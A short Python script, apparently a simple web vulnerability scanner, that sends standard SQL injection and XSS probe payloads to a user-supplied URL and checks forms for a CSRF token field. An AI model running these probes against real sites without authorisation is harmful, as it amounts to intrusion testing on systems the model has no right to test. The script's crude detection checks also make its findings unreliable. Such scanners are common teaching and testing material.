import requests  # Importing the requests library to handle HTTP requests
from bs4 import BeautifulSoup  # Importing BeautifulSoup for parsing HTML
from urllib.parse import urlparse  # Importing urlparse for URL validation

def is_valid_url(url):
    parsed_url = urlparse(url)  # Parsing the URL
    return all([parsed_url.scheme, parsed_url.netloc])  # Checking if the URL has a scheme and netloc

def get_target_url():
    url = input("Please enter the target URL: ").strip()  # Prompting the user to enter a URL and stripping any extra spaces
    if not is_valid_url(url):  # Checking if the entered URL is valid
        print("Invalid URL. Please enter a valid URL (e.g., https://www.example.com).")  # Printing an error message for an invalid URL
        return get_target_url()  # Recursively asking for a valid URL
    return url  # Returning the valid URL

def test_sql_injection(url):
    sql_payloads = ["'", "' OR 1=1 --", "\" OR \"\"=\""]  # List of SQL injection payloads to test
    for payload in sql_payloads:  # Iterating over each payload
        full_url = f"{url}?q={payload}"  # Constructing the full URL with the payload
        response = requests.get(full_url)  # Sending a GET request to the constructed URL
        if "SQL" in response.text or "syntax" in response.text:  # Checking if the response contains SQL error messages
            print(f"[!] Potential SQL Injection vulnerability found with payload: {payload}")  # Printing a warning if a vulnerability is found
        else:
            print(f"[+] No SQL Injection vulnerability with payload: {payload}")  # Printing a message if no vulnerability is found

def test_xss(url):
    xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]  # List of XSS payloads to test
    for payload in xss_payloads:  # Iterating over each payload
        full_url = f"{url}?q={payload}"  # Constructing the full URL with the payload
        response = requests.get(full_url)  # Sending a GET request to the constructed URL
        if payload in response.text:  # Checking if the payload is reflected in the response
            print(f"[!] Potential XSS vulnerability found with payload: {payload}")  # Printing a warning if a vulnerability is found
        else:
            print(f"[+] No XSS vulnerability with payload: {payload}")  # Printing a message if no vulnerability is found

def test_csrf(url):
    response = requests.get(url)  # Sending a GET request to the target URL
    soup = BeautifulSoup(response.text, 'html.parser')  # Parsing the HTML response with BeautifulSoup
    forms = soup.find_all('form')  # Finding all forms in the HTML
    for form in forms:  # Iterating over each form
        if not form.find('input', {'name': 'csrf_token'}):  # Checking if the form contains a CSRF token
            print("[!] Potential CSRF vulnerability found: No CSRF token in form")  # Printing a warning if a vulnerability is found
        else:
            print("[+] CSRF token found in form")  # Printing a message if a CSRF token is found

def main():
    target_url = get_target_url()  # Getting the target URL from the user
    print(f"Testing {target_url} for vulnerabilities...")  # Printing a message indicating the start of tests
    
    print("\n[+] Testing for SQL Injection...")  # Indicating the start of SQL injection tests
    test_sql_injection(target_url)  # Running the SQL injection tests
    
    print("\n[+] Testing for XSS...")  # Indicating the start of XSS tests
    test_xss(target_url)  # Running the XSS tests
    
    print("\n[+] Testing for CSRF...")  # Indicating the start of CSRF tests
    test_csrf(target_url)  # Running the CSRF tests

if __name__ == "__main__":
    main()  # Running the main function if the script is executed directly
